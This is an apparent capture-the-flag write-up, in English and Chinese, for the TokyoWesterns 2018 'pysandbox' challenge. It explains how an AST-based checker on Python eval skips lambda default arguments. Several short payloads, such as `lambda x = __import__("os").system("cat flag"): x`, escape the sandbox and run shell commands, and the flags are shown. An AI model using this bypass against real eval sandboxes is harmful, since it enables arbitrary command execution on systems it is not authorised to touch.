# TokyoWesterns 2018 : pysandbox

**category** : misc

**points** : 121, 126

**solves** : 52, 48

## write-up ( English version )

`sys.stdout.write(repr(eval(expr)))`

Our input will be sent to `eval` function

The program use some rules to check every node on `ast` ( abstract syntax tree ) 

`print(ast.dump(ast.parse(expr)))`

Use `ast.dump` to see how ast looks like

```
[1, 2]
Module(body=[Expr(value=List(elts=[Num(n=1), Num(n=2)], ctx=Load()))])
```

According to `attributes`, the program will check `value` in `Expr` and `elts` in `List`

And will only check the node `attributes` specify

That means what `attributes` not specify will not be checked

There must be some where they miss, I bet they are not python compiler master too.

```
lambda x: x
Module(body=[Expr(value=Lambda(args=arguments(args=[Name(id='x', ctx=Param())], vararg=None, kwarg=None, defaults=[]), body=Name(id='x', ctx=Load())))])
```

In `lambda`, they only check `body`.

But `defaults`, where we put default values in parameters, can put all kinds of things

Let's put `os.system`

```
lambda x = __import__("os").system("ls"): x
flag
run.sh
sandbox.py
```

```
lambda x = __import__("os").system("cat flag"): x
TWCTF{go_to_next_challenge_running_on_port_30002}
```

`TWCTF{go_to_next_challenge_running_on_port_30002}`

Yeah, second round

```
lambda x = __import__("os").system("ls"): x
flag
flag2
run.sh
sandbox2.py
```

```
lambda x = __import__("os").system("cat flag2"): x
TWCTF{baby_sandb0x_escape_with_pythons}
```

Oops, same solution for two flags, lucky me XD

`TWCTF{baby_sandb0x_escape_with_pythons}`

## write-up ( 中文版 )

`sys.stdout.write(repr(eval(expr)))`

把我們的輸入做 `eval`

但是前面會用 `ast` 去檢查 abstract syntax tree 上的節點

`print(ast.dump(ast.parse(expr)))`

先用 `ast.dump` 去看 ast 長什麼樣子

```
[1, 2]
Module(body=[Expr(value=List(elts=[Num(n=1), Num(n=2)], ctx=Load()))])
```

那根據他寫的 `attributes` 他會去檢查 `Expr` 的 `value` 和裡面的 `List` 的 `elts`

只有在他寫的規則裡面他都會走進去該節點做檢查

但是只要他的規則沒寫到的節點他就不會走進去檢查

python 的語法這麼多肯定有哪裡漏掉

```
lambda x: x
Module(body=[Expr(value=Lambda(args=arguments(args=[Name(id='x', ctx=Param())], vararg=None, kwarg=None, defaults=[]), body=Name(id='x', ctx=Load())))])
```

`lambda` 只有檢查 `body` 但是可以發現參數的地方可以放 `defaults` 裡面可以放各種東西

```
lambda x = __import__("os").system("ls"): x
flag
run.sh
sandbox.py
```

```
lambda x = __import__("os").system("cat flag"): x
TWCTF{go_to_next_challenge_running_on_port_30002}
```

`TWCTF{go_to_next_challenge_running_on_port_30002}`

接下來就來到第二關

```
lambda x = __import__("os").system("ls"): x
flag
flag2
run.sh
sandbox2.py
```

```
lambda x = __import__("os").system("cat flag2"): x
TWCTF{baby_sandb0x_escape_with_pythons}
```

啊一次就過了兩關...XD

`TWCTF{baby_sandb0x_escape_with_pythons}`

# other write-ups and resources

